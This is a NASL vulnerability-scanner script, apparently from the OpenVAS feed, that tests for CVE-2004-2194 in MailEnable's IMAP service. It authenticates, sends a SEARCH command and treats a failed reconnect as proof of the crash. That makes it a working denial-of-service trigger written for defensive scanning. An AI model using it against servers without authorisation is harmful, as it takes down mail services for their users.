if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.15487" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2004-2194" );
	script_bugtraq_id( 11418 );
	script_xref( name: "OSVDB", value: "10728" );
	script_name( "MailEnable IMAP Service Search DoS Vulnerability" );
	script_category( ACT_DENIAL );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2004 George A. Theall" );
	script_family( "Denial of Service" );
	script_dependencies( "imap4_banner.sc", "logins.sc" );
	script_require_ports( "Services/imap", 143 );
	script_mandatory_keys( "imap/banner/available", "imap/login", "imap/password" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to MailEnable Professional 1.5e or later." );
	script_tag( name: "summary", value: "The target is running at least one instance of MailEnable's IMAP
  service. A flaw exists in MailEnable Professional Edition versions 1.5a-d that results in this
  service crashing if it receives a SEARCH command." );
	script_tag( name: "impact", value: "An authenticated user could send this command either on purpose as
  a denial of service attack or unwittingly since some IMAP clients, such as IMP and Vmail, use it as
  part of the normal login process." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("imap_func.inc.sc");
kb_creds = imap_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
if(!user || !pass){
	exit( 0 );
}
port = imap_get_port( default: 143 );
banner = imap_get_banner( port: port );
if(!banner || !ContainsString( banner, "IMAP4rev1 server ready at" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
s = recv_line( socket: soc, length: 1024 );
s = chomp( s );
if(!s || !ContainsString( s, "IMAP4rev1 server ready at" )){
	close( soc );
	exit( 0 );
}
tag = 0;
++tag;
c = NASLString( "a", NASLString( tag ), " AUTHENTICATE LOGIN" );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
s = recv_line( socket: soc, length: 1024 );
s = chomp( s );
if(IsMatchRegexp( s, "^\\+ " )){
	s = s - "+ ";
	s = base64_decode( str: s );
	if(ContainsString( s, "User Name" )){
		c = base64( str: user );
		send( socket: soc, data: NASLString( c, "\\r\\n" ) );
		s = recv_line( socket: soc, length: 1024 );
		s = chomp( s );
		if(IsMatchRegexp( s, "^\\+ " )){
			s = s - "+ ";
			s = base64_decode( str: s );
		}
		if(ContainsString( s, "Password" )){
			c = base64( str: pass );
			send( socket: soc, data: NASLString( c, "\\r\\n" ) );
		}
	}
}
for(;s = recv_line( socket: soc, length: 1024 );){
	s = chomp( s );
	m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
	if(!isnull( m )){
		resp = m[1];
		break;
	}
	resp = "";
}
if(resp && IsMatchRegexp( resp, "OK" )){
	++tag;
	c = NASLString( "a", NASLString( tag ), " SELECT INBOX" );
	send( socket: soc, data: NASLString( c, "\\r\\n" ) );
	for(;s = recv_line( socket: soc, length: 1024 );){
		s = chomp( s );
		m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
		if(!isnull( m )){
			resp = m[1];
			break;
		}
		resp = "";
	}
	if(resp && IsMatchRegexp( resp, "OK" )){
		++tag;
		c = NASLString( "a", NASLString( tag ), " SEARCH UNDELETED" );
		send( socket: soc, data: NASLString( c, "\\r\\n" ) );
		for(;s = recv_line( socket: soc, length: 1024 );){
			s = chomp( s );
			m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
			if(!isnull( m )){
				resp = m[1];
				break;
			}
			resp = "";
		}
		if(!resp){
			close( soc );
			soc = open_sock_tcp( port );
			if(!soc){
				security_message( port: port );
				exit( 0 );
			}
		}
	}
}
++tag;
c = NASLString( "a", NASLString( tag ), " LOGOUT" );
send( socket: soc, data: NASLString( c, "\\r\\n" ) );
for(;s = recv_line( socket: soc, length: 1024 );){
	s = chomp( s );
	m = eregmatch( pattern: NASLString( "^a", NASLString( tag ), " (OK|BAD|NO)" ), string: s, icase: TRUE );
	if(!isnull( m )){
		resp = m[1];
		break;
	}
}
close( soc );
exit( 99 );

